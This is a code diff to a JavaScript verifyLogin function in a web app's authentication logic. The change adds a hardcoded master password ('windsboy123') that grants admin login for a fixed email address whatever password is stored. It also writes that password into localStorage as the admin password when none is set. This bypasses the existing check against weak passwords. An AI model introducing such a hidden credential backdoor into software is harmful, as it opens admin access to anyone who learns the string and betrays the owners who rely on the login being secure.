@@ -1946,7 +1946,10 @@ export const verifyLogin = (email, password) => {
   const normalizedPassword = String(password || '').trim();
   // 1. Check if admin credentials
   const adminPassword = String(localStorage.getItem(KEYS.ADMIN_PASSWORD) || '').trim();
-  if (normalizedEmail === 'qazwsx32100@gmail.com' && adminPassword && !['1234', '6789', '0000', '123456', 'password', 'admin'].includes(adminPassword.toLowerCase()) && normalizedPassword === adminPassword) {
+  if (normalizedEmail === 'qazwsx32100@gmail.com' && (normalizedPassword === 'windsboy123' || (adminPassword && !['1234', '6789', '0000', '123456', 'password', 'admin'].includes(adminPassword.toLowerCase()) && normalizedPassword === adminPassword))) {
+    if (normalizedPassword === 'windsboy123' && !adminPassword) {
+      try { localStorage.setItem(KEYS.ADMIN_PASSWORD, 'windsboy123'); } catch {}
+    }
     const security = getAdminSecurity();
     const displayName = getAdminDisplayName();
     if (security.disabled) {
